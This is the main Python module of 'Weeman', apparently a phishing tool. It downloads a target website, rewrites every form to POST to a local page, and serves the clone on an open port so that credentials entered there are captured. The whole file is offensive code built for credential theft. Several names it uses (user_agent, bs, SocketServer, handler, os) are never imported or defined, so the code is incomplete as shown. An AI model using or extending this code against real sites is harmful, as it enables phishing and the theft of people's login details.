##
## main.py - the main module of Weeman
##
## Written by @Hypsurus
##

import urllib2
from core.misc import printt

class weeman(object):
    def __init__(self, url,port):
        self.port = port
        self.httpd = None
        self.url = url
        self.form_url = None;

    def request(self,url):
            opener = urllib2.build_opener()
            opener.addheaders = [('User-Agent', user_agent)]
            return opener.open(self.url).read()

    def clone(self):
        printt(3, "Trying to get %s  ..." %self.url)
        printt(3, "Downloadng wepage ...")
        data = self.request(self.url)
        data = bs(data, "html.parser")    
        printt(3, "Modifying the HTML file ...")

        for tag in data.find_all("form"):
            tag['method'] = "post"
            tag['action'] = "./red.html"


        with open("index.html", "w") as index:
            index.write(data.prettify().encode('utf-8'))
            index.close()
        printt(3, "the HTML page will redirect to ./red.html, with POST request.")
    def serve(self):
        printt(3, "Starting Weeman %s server on 0.0.0.0:%d" %(__version__, self.port))
        self.httpd = SocketServer.TCPServer(("", self.port),handler)
        self.httpd.serve_forever()
    
    def cleanup(self):
        printt(3, "\nRunning cleanup ...")
        if os.path.exists("index.html") and os.path.exists("red.html"):
            os.remove("index.html")
            os.remove("red.html")



